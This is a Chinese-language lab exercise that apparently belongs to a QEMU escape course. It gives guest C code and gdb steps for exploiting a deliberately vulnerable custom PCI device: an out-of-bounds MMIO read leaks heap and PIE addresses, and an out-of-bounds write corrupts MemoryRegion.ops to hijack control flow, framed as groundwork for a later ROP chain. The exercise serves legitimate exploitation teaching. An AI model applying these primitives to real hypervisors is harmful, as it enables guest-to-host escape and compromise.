# 練習 B — 分析並觸發自訂 PCI device 的 OOB

> **目標**：拿 Ch 12 的 vuln PCI device（`buf[0x100]` 無邊界檢查），從 guest 端觸發 OOB read 洩漏 heap 資料，觸發 OOB write 蓋寫鄰接結構，並用 DMA 把 leak 出的資料搬回 guest 可讀處。

> **環境**：QEMU 9.0 / x86-64 / Linux（Ubuntu 22.04/24.04，自編 debug QEMU + Ch 12 vuln device）

---

## 背景動機

到這裡你已經知道：

- MMIO dispatch 把 guest 的 BAR offset 直接變成 device callback 的 `addr` 參數（Ch 11）。
- Device callback 如果直接用 `s->buf + addr` 做讀寫且無邊界檢查，就是 heap 上的 OOB（Ch 12）。
- QEMU heap 上的相鄰物件可能含 `MemoryRegion.ops` 或 `QEMUTimer.cb` 這類 function pointer（Ch 14）。
- OOB read → leak → OOB write → 蓋 function pointer 是完整利用鏈的前半段（Ch 15）。

這個練習把上面全部接起來。你要做的不是完整逃逸（Part 3 才做），而是確認每個原語真的如預期工作。沒有「觸發過、親眼看到 gdb 輸出」的理解，後面的 exploit 寫起來是猜謎。

---

## 任務規格

### 前提：vuln device 設定（Ch 12 的產物）

`VulnState` 的 MMIO read/write handler（`vuln_mmio_read` / `vuln_mmio_write`）對所有 offset 直接做：

```c
/* read */
return *(uint64_t *)(s->buf + addr);

/* write */
*(uint64_t *)(s->buf + addr) = data;
```

BAR0 大小為 `0x1000`，QEMU 的 MemoryRegion 設定允許 0x0000–0x0FFF 的 offset。`buf` 大小為 `0x100`——任何 `addr >= 0x100` 的存取都是 OOB。

### 任務 1：OOB Read（洩漏 heap 資料）

**輸入**：guest 端 MMIO read，offset = 0x100、0x108、0x110…（逐 8-byte 掃描）。

**輸出 / 驗收**：
- 讀出至少一個看起來像 **QEMU PIE 位址**（`0x5555_5xxx_xxxx` 或 `0x5556_xxxx_xxxx`，依 ASLR）或 **heap 位址**（`0x5555_5xxx_xxxx` 區段的動態分配，或 `0x7f...`）的 qword。
- 在 host gdb 中確認：`print *(uint64_t *)((char *)s->buf + offset)` 的值和 guest 讀到的一致。
- bonus：算出 `pie_base`（用 `nm qemu-system-x86_64 | grep vuln_mmio_ops` 找 RVA，減掉讀出的 ops 值）。

### 任務 2：OOB Write（蓋寫鄰接資料）

**輸入**：guest 端 MMIO write，offset = 某個你從任務 1 確認「有意義指標」的位置，value = `0xdeadbeef00000000`。

**輸出 / 驗收**：
- 在 host gdb 確認那個位置的值已從原本的合法指標變成 `0xdeadbeef00000000`。
- 觸發使用那個指標的行為（MMIO 讀寫、timer tick），觀察 QEMU 的反應：`SIGSEGV`？segfault address？gdb backtrace 顯示的 crash 位置（預期在 `memory_region_dispatch_write` 或 timer loop 附近）。
- 記錄 gdb 的 `bt` 輸出（crash frame）。

### 任務 3（加分）：DMA 搬運 leak 資料到 guest

**輸入**：利用 Ch 13 的 DMA 機制（edu device 或 vuln device 自己的 DMA 暫存器），把 vuln device 的 `dma_buf`（包含你 OOB 讀出的資料）搬到 guest 的一個已知 GPA（你 mlock 的頁面）。

**輸出 / 驗收**：
- guest C 程式在觸發 DMA 搬運後，能從 guest 記憶體裡讀到那個 PIE/heap 位址值。
- 整個流程不需要 gdb 介入——純粹靠 guest 程式自動完成 leak + 搬運 + 讀出。

---

## 期望輸出範例

### 任務 1 的 guest 程式輸出

```
[*] BAR0 mapped at: 0x7f8800000000
[*] Scanning OOB offsets (0x100 ~ 0x200, step 8):
[OOB+0x00] 0x0000000000000000
[OOB+0x08] 0x5555556a7b40        <- heap pointer!
[OOB+0x10] 0x00007f880023c000
[OOB+0x18] 0x0000000000001000
[OOB+0x20] 0x555555a12340        <- looks like PIE .text/.rodata
[OOB+0x28] 0x5555556a7c80
[OOB+0x30] 0x0000000000000000
...

[*] Candidate PIE leak at OOB+0x20: 0x555555a12340
[*] vuln_mmio_ops RVA = 0x6a1240  (from nm)
[*] Calculated PIE base: 0x555555000000  <- likely correct if ends in 000
```

（未實測，理論預期；實際值因 ASLR 每次啟動不同，結構形態相似。）

### 任務 2 的 host gdb 輸出

```
(gdb) print *(uint64_t *)((char *)s->buf + 0x120)
$1 = 0x555555a12340

# guest 端寫 bar+0x120 = 0xdeadbeef00000000 後
(gdb) print *(uint64_t *)((char *)s->buf + 0x120)
$2 = 0xdeadbeef00000000

# guest 端觸發 MMIO 讀 bar+0
Program received signal SIGSEGV, Segmentation fault.
0x00005555557c3a10 in memory_region_dispatch_read (...)
(gdb) bt
#0  0x00005555557c3a10 in memory_region_dispatch_read (...)
#1  0x00005555557c4120 in flatview_read_continue (...)
#2  0x00005555558a2310 in address_space_read_full (...)
...
(gdb) p mr->ops
$3 = (const MemoryRegionOps *) 0xdeadbeef00000000   <- 成功蓋掉
```

（未實測，理論預期；crash 地址和 bt 深度依 QEMU 9.0 的實際呼叫路徑而定。）

---

## 如果卡住了

1. **找不到 BAR0 的 sysfs 路徑**：在 guest 裡 `lspci -v`，找 vuln device 的 bus:dev.func；對應的 resource0 路徑是 `/sys/bus/pci/devices/0000:XX:XX.X/resource0`。如果 resource0 大小是 0，device 沒正確設定 BAR——回 Ch 12 確認 `pci_register_bar` 呼叫。

2. **MMIO read 回傳全零**：可能是 QEMU 的 MemoryRegion 設定了 `valid.max_access_size = 4`（只允許 32-bit 存取），但你用 `uint64_t *` 做 64-bit 讀。改用 `uint32_t` 讀兩次再拼，或確認 device 設定允許 64-bit 存取（`ops.impl.min/max_access_size`）。

3. **OOB read 讀出 0 或隨機垃圾，找不到合理指標**：struct layout 和預期不符，`buf` 後面可能是其他非指標欄位。用 `pahole -C VulnState qemu-system-x86_64` 看真實 layout，調整掃描範圍。如果 `MemoryRegion mmio` 在 `buf` 之前（offset 更小），OOB 往後讀碰不到 ops——改掃 offset 更大的範圍，尋找 `dma_timer` 指標或 PCIDevice 結尾的其他欄位。

---

## 實作步驟

### Step 1：確認 struct layout（host 環境）

```bash
# 在 Linux host，需要 dwarves 套件
sudo apt install dwarves
pahole -C VulnState /path/to/qemu-system-x86_64
```

記錄：
- `buf` 的 offset（相對 struct 起點）
- `buf` 之後第一個指標型欄位的 offset（例如 `MemoryRegion.ops` 或 `QEMUTimer *`）
- 計算 `OOB_read_offset = field_offset - buf_offset`

**如果沒有 debug symbol 的 QEMU**：在 device 的 `realize` 函式裡加一行 `printf("buf offset: %zu\n", offsetof(VulnState, buf));`，重編確認。

### Step 2：啟動 QEMU + gdb attach（host 環境）

```bash
# terminal 1：啟動帶 vuln device 的 debug QEMU
./qemu-system-x86_64 \
  -device vuln \
  -kernel /path/to/guest.bzImage \
  -append "console=ttyS0 nokaslr" \
  -nographic \
  -s \
  -m 256M

# terminal 2：gdb attach
gdb -p $(pgrep qemu-system)
(gdb) set pagination off
(gdb) b vuln_mmio_read
(gdb) b vuln_mmio_write
(gdb) b vuln_dma_timer   # 如果有 DMA timer
(gdb) c
```

（vuln device 的 `realize` 完成後，在 gdb 找 `s` 指標：`p (VulnState *)$rdi` 或從 `vuln_mmio_read` 的第一個 `opaque` 參數）

### Step 3：撰寫 guest 端觸發程式（guest 環境）

```c
/* guest_oob.c（未實測，理論預期）*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define BAR_SIZE 0x1000

int main(void) {
    /* 1. 找 BAR0 路徑 */
    const char *resource = "/sys/bus/pci/devices/0000:00:04.0/resource0";
    int fd = open(resource, O_RDWR | O_SYNC);
    if (fd < 0) { perror("open"); return 1; }

    volatile uint8_t *bar = mmap(NULL, BAR_SIZE,
                                  PROT_READ | PROT_WRITE,
                                  MAP_SHARED, fd, 0);
    if (bar == MAP_FAILED) { perror("mmap"); return 1; }

    printf("[*] BAR0 mapped\n");

    /* 2. 合法讀（確認 MMIO 正常）*/
    uint32_t v = *(volatile uint32_t *)(bar + 0x00);
    printf("[*] bar[0x00] = 0x%08x (should be device ID or similar)\n", v);

    /* 3. OOB read：掃描 buf 之後的 heap 內容 */
    printf("[*] OOB scan (offset 0x100 ~ 0x200):\n");
    for (int off = 0x100; off <= 0x200; off += 8) {
        /* 注意：一次 8 bytes 需要 device ops 支援 64-bit 存取 */
        uint64_t val = *(volatile uint64_t *)(bar + off);
        printf("[OOB+0x%02x] 0x%016lx\n", off - 0x100, val);
    }

    /* 4. OOB write：蓋掉一個看起來像 PIE 指標的 offset
     * 先從 Step 3 的輸出選一個合理的 offset，這裡暫用 0x120 當佔位
     * 實際要替換成你 Step 1 pahole 確認的 offset */
    int target_offset = 0x120;   /* TODO: 替換成真實 struct offset */
    printf("\n[*] OOB write: overwriting offset 0x%x with 0xdeadbeef00000000\n",
           target_offset);
    *(volatile uint64_t *)(bar + target_offset) = 0xdeadbeef00000000ULL;
    printf("[*] Written. Now trigger MMIO to see crash...\n");

    /* 5. 觸發使用被蓋欄位的操作 */
    /* 讀 bar[0]（觸發 .read callback，如果 ops 被蓋掉就 crash）*/
    volatile uint32_t trigger = *(volatile uint32_t *)(bar + 0x00);
    printf("[*] bar[0x00] after overwrite = 0x%08x\n", trigger);
    /* 如果到這行還沒 crash，表示 ops 沒在那個 offset，調整 target_offset */

    munmap((void *)bar, BAR_SIZE);
    close(fd);
    return 0;
}
```

在 guest 裡編譯並執行：

```bash
gcc -O0 -o guest_oob guest_oob.c && ./guest_oob
```

### Step 4：在 host gdb 觀察並記錄

觸發 OOB write 並 crash 後，在 gdb 記錄：

```gdb
(gdb) bt               # 看 crash frame
(gdb) p mr->ops        # 確認 ops 指標已被蓋
(gdb) x/4i $pc         # 看 crash 時的指令
(gdb) p $rdi           # 通常是第一個參數（opaque / mr）
```

### Step 5（加分）：DMA 搬運

如果 vuln device 有 DMA 暫存器（或使用 edu device 的 DMA），在 guest 端：

```c
/* 假設 vuln device 沿用 edu-style DMA 暫存器在 BAR0 的 0x80-0x98 */
/* 1. 把 OOB 讀出的資料放進 device dma_buf（透過 DMA from_guest，
      src = 你的 buffer GPA，dst = 0，cnt = 8）*/
/* 2. 觸發 DMA（設 DMA_CMD）*/
/* 3. 等 timer 觸發（sleep 1ms 以上）*/
/* 4. 讀 DMA_DST 對應的位置（如果 device 有讀 dma_buf 回 guest 的功能）*/
```

（此任務依 vuln device 是否真的有 DMA 暫存器而定；如果 Ch 12 的 device 沒有 DMA，用 edu device 旁邊的 BAR 做 DMA，把 edu 的 dma_buf 填成你想傳回 guest 的值，再用 DMA to_guest 搬到你控制的 GPA。）

---

<details>
<summary>參考解答（點開前先自己做完！）</summary>

### 完整 guest 觸發程式（參考版）

```c
/*
 * guest_oob_full.c — 練習 B 完整參考解答
 *
 * 警告：未實測，理論預期。
 * 在 Linux host + 自編 debug QEMU + Ch 12 vuln device 環境下執行。
 * struct offset（BUF_IN_STRUCT、OPS_OOB_OFFSET 等）需先用 pahole 確認。
 *
 * 驗證步驟：
 *   1. 在 guest 編譯：gcc -O0 -o guest_oob_full guest_oob_full.c
 *   2. 在 host 另一 terminal：gdb -p $(pgrep qemu-system)
 *                              (gdb) b vuln_mmio_write
 *                              (gdb) c
 *   3. 在 guest 執行：sudo ./guest_oob_full
 *   4. 觀察 gdb 斷點觸發，確認每次 write 的 opaque/addr/data 參數。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

/* 需根據 pahole 輸出填入真實值 */
#define BAR_SIZE         0x1000
#define BUF_SIZE         0x100

/* OOB offset 相對於 buf 起點（= addr 參數的值 - 0，因 buf 就在 addr=0 處）
 * 下面是「假設值」，實際用 pahole 確認 */
#define OPS_OOB_OFFSET   0x120   /* MemoryRegion.ops 相對 buf 的 offset，需 pahole 確認 */
#define TIMER_OOB_OFFSET 0x1c8   /* QEMUTimer.cb 相對 buf 的 offset，需 pahole 確認 */

/* 從 nm 取得的 RVA（假設值，需用 nm qemu-system-x86_64 | grep vuln_mmio_ops 確認）*/
#define VULN_MMIO_OPS_RVA  0x6a1240ULL   /* 假設值 */

static volatile uint8_t *bar;

static uint64_t mmio_read64(int offset) {
    return *(volatile uint64_t *)(bar + offset);
}

static void mmio_write64(int offset, uint64_t val) {
    *(volatile uint64_t *)(bar + offset) = val;
}

int main(void) {
    /* === 初始化：mmap BAR0 === */
    const char *resource = "/sys/bus/pci/devices/0000:00:04.0/resource0";
    int fd = open(resource, O_RDWR | O_SYNC);
    if (fd < 0) { perror("open resource0"); return 1; }

    bar = mmap(NULL, BAR_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (bar == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[*] BAR0 mmap OK\n");

    /* === Task 1：OOB Read Scan === */
    printf("\n=== Task 1: OOB Read Scan ===\n");
    uint64_t candidate_pie_leak = 0;
    int      candidate_offset   = -1;

    for (int off = BUF_SIZE; off < BUF_SIZE + 0x200; off += 8) {
        uint64_t val = mmio_read64(off);
        if (val == 0) continue;
        printf("  [buf+0x%03x] 0x%016lx", off, val);
        /* 粗略判斷是否像 PIE/heap 位址 */
        if ((val >> 40) == 0x555555 || (val >> 40) == 0x555556) {
            printf("  <- looks like PIE or heap addr");
            if (candidate_pie_leak == 0) {
                candidate_pie_leak = val;
                candidate_offset   = off;
            }
        }
        printf("\n");
    }

    if (candidate_pie_leak) {
        uint64_t pie_base = candidate_pie_leak - VULN_MMIO_OPS_RVA;
        printf("\n[*] Candidate leak at buf+0x%03x: 0x%016lx\n",
               candidate_offset, candidate_pie_leak);
        printf("[*] Calculated PIE base: 0x%016lx\n", pie_base);
        printf("    (Verify with host gdb: info proc mappings)\n");
    } else {
        printf("[!] No obvious PIE/heap leak found. Check pahole layout.\n");
    }

    /* === Task 2：OOB Write → 蓋 ops 指標 === */
    printf("\n=== Task 2: OOB Write (overwrite MemoryRegion.ops) ===\n");

    /* 先讀出原始值 */
    uint64_t orig_ops = mmio_read64(OPS_OOB_OFFSET);
    printf("[*] Original ops at buf+0x%03x: 0x%016lx\n", OPS_OOB_OFFSET, orig_ops);

    /* 蓋成 0xdeadbeef00000000 */
    printf("[*] Overwriting with 0xdeadbeef00000000...\n");
    mmio_write64(OPS_OOB_OFFSET, 0xdeadbeef00000000ULL);

    /* 驗證寫入 */
    uint64_t after = mmio_read64(OPS_OOB_OFFSET);
    printf("[*] Value after write: 0x%016lx\n", after);
    if (after == 0xdeadbeef00000000ULL) {
        printf("[*] OOB write confirmed!\n");
    }

    /* 觸發：讀 bar+0，讓 QEMU 用 ops->read，應該 SIGSEGV */
    printf("[*] Triggering MMIO read to use corrupted ops...\n");
    printf("    (Expect QEMU crash / SIGSEGV on host)\n");
    uint32_t trigger = *(volatile uint32_t *)(bar + 0);
    /* 如果跑到這裡，說明 ops 不在那個 offset，需調整 OPS_OOB_OFFSET */
    printf("[!] Did not crash?! trigger=0x%08x — adjust OPS_OOB_OFFSET\n", trigger);

    munmap((void *)bar, BAR_SIZE);
    close(fd);
    return 0;
}
```

### host gdb 觀察指令序列

```gdb
# 1. Attach 後設置斷點
(gdb) b vuln_mmio_read
(gdb) b vuln_mmio_write
(gdb) set pagination off
(gdb) c

# 2. 斷在 vuln_mmio_write，查 OOB write 的參數
(gdb) p addr          # 應等於 OPS_OOB_OFFSET 值
(gdb) p /x data       # 應等於 0xdeadbeef00000000
(gdb) p /x ((VulnState *)opaque)->mmio.ops  # 原始 ops 指標

# 3. continue，等 crash
(gdb) c

# 4. Crash 後
(gdb) bt              # 看完整 call stack
(gdb) p /x $pc        # crash 時的指令指標
(gdb) p /x mr->ops    # 確認 ops 已被蓋
(gdb) info signal     # 確認是 SIGSEGV

# 5. 如果沒 crash，手動確認蓋入
(gdb) p /x *(uint64_t *)((char *)((VulnState *)opaque)->buf + OPS_OOB_OFFSET)
```

### 加分：DMA 搬運的概念說明

DMA 搬運任務的完整實作依賴 vuln device 是否有 DMA 暫存器。以下是使用 edu device 的替代方案（未實測，理論預期）：

1. 啟動 QEMU 同時帶 vuln device 和 edu device（`-device vuln -device edu`）。
2. 對 edu device 的 DMA_BUF（device 內部 buffer）做操作：
   - 先 MMIO 寫 edu BAR0 + 0x80（DMA_SRC）= guest buffer GPA（你 mlock 的某個頁）。
   - MMIO 寫 DMA_DST = 0（edu 內部 buf offset）。
   - MMIO 寫 DMA_CNT = 8。
   - MMIO 寫 DMA_CMD = 1（from_guest：把 guest buffer GPA 的 8 bytes 搬進 edu dma_buf[0..7]）。
3. 等 timer 1ms 觸發。
4. 用 MMIO read 讀 edu 的 dma_buf 內容（edu device 有 `MMIO_REG_DMA_BUF_ADDR` 類型的讀介面）。

更常見的方式是把 leak 出的值透過 guest 端的 MMIO read 直接拿到（不需要 DMA）——DMA 加分題示範的是「device 主動把資料推回 guest 記憶體」的場景，在 infoleak 章節（Ch 17）會用到。

### Linux 驗證步驟

**未實測，理論預期**。以下是完整驗證流程：

```bash
# 1. 在 Linux host 上
sudo apt install dwarves qemu-system-x86_64 gdb gcc

# 2. 自編 QEMU 9.0（含 Ch 12 vuln device patch）
git clone https://gitlab.com/qemu-project/qemu -b v9.0.0
# 把 Ch 12 的 hw/misc/vuln.c 和 hw/misc/meson.build 修改套入
cd qemu && mkdir build && cd build
../configure --enable-debug --target-list=x86_64-softmmu --disable-werror
make -j$(nproc)

# 3. 準備 guest kernel（最小 initramfs 即可）
# 4. 啟動 QEMU（見 Step 2）
# 5. 在 guest 編譯並執行 guest_oob_full.c
# 6. 觀察 host gdb 輸出
```

</details>

---

## 測試用例表

| 測試用例 | 輸入（guest MMIO）| 預期 host 行為 | 驗收方式 |
|---------|-----------------|--------------|---------|
| 合法讀（基準）| `bar + 0x00`（in-bounds）| device 正常回傳值 | 不 crash，gdb 正常斷點 |
| OOB read（+0x100）| `bar + 0x100` | 讀出 buf 後方 heap 資料 | gdb 確認值一致 |
| OOB read（+ops_offset）| `bar + OPS_OOB_OFFSET` | 讀出 `MemoryRegion.ops` 原值 | 值 == gdb `p mr->ops` |
| OOB write（蓋 ops）| `bar + OPS_OOB_OFFSET` = `0xdeadbeef...` | ops 被蓋 | gdb `p mr->ops` = 0xdeadbeef... |
| 觸發 crash | `bar + 0x00`（讀，ops 已壞）| QEMU SIGSEGV | gdb `bt` 停在 dispatch 路徑 |
| 恢復（可選）| `bar + OPS_OOB_OFFSET` = 原 ops 值 | QEMU 恢復正常 | 後續 MMIO 不 crash |

---

## 延伸挑戰

1. **不 crash，只觀察**：在 OOB write 前先讀出原始 ops 值；蓋掉後觸發 crash；crash 前在 gdb 裡把 ops 復原（`set *(uint64_t *)(...)  = orig_ops`），讓 QEMU 繼續跑。這個技巧在除錯 exploit 時非常有用——你可以重複觸發 OOB write 的不同 offset，找到正確目標後再讓它真的 crash。

2. **Struct offset 自動化**：寫一個 guest 程式，對 buf 之後的所有 8-byte 對齊 offset 做讀，然後自動分析哪些值「看起來像 QEMU PIE 位址」（高三字節是 `0x555555` 或 `0x555556`），哪些「看起來像 heap 位址」，哪些「看起來像 libc 位址」（高字節 `0x7f`），輸出一份分類表。

3. **蓋 QEMUTimer.cb 而非 ops**：如果 struct layout 讓 `QEMUTimer *dma_timer` 比 `MemoryRegion.ops` 更容易用 OOB 碰到，改成蓋 `timer->cb`，然後等 timer tick 觸發，觀察 crash 的 stack trace 有何不同（應停在 `timerlistgroup_run_timers` 路徑而非 memory dispatch）。

4. **Heap groom 嘗試**：在 OOB write 前，先觸發一系列 guest 動作讓某個你選定的物件落在 VulnState 之後。用 gdb 驗證佈局是否如預期。記錄哪種動作能穩定讓目標物件相鄰。

5. **計算 pie_base 並驗證**：把 OOB read 讀出的 ops 值減去 `nm` 得到的 RVA，得到 `pie_base`。用 gdb `info proc mappings` 驗證 pie_base 是否落在 QEMU binary 的映射起點。如果一致，你就完成了整個 leak 流程的前半——為 Ch 17 infoleak 章節熱身。

---

## 自我檢核

- [ ] 我能在 guest 端 mmap PCI BAR0，並說出為什麼每次讀寫 bar+offset 都會觸發 VMEXIT。
- [ ] 我能說出 OOB read 讀到的「鄰居 heap 資料」是相對於什麼基準、為什麼 ASLR 不影響相對 offset。
- [ ] 我做了 host gdb 驗證（`p *(uint64_t *)(buf + offset)` 和 guest 讀值一致），不是只跑程式就相信輸出。
- [ ] 我能解釋 OOB write 蓋掉 `MemoryRegion.ops` 後，為什麼下次 MMIO read 會 crash 在 `memory_region_dispatch_read` 而不是 `vuln_mmio_read`。
- [ ] 我理解「觸發 crash」和「觸發 exploit」的區別：crash 代表控制流被劫持但跑到無效位址；exploit 是讓控制流到你選的 gadget。這個練習做到 crash，Part 3 做到 exploit。

---

> 你現在親手確認了「OOB read → leak heap 資料」和「OOB write → 蓋 function pointer → crash」這兩個原語確實成立。有了這兩個原語，Part 3 的利用鏈就是把這裡的 `0xdeadbeef` 換成真正的 gadget 位址，再加上 ROP chain 的部分。

→ [Ch 16](./16-first-mmio-oob.md)
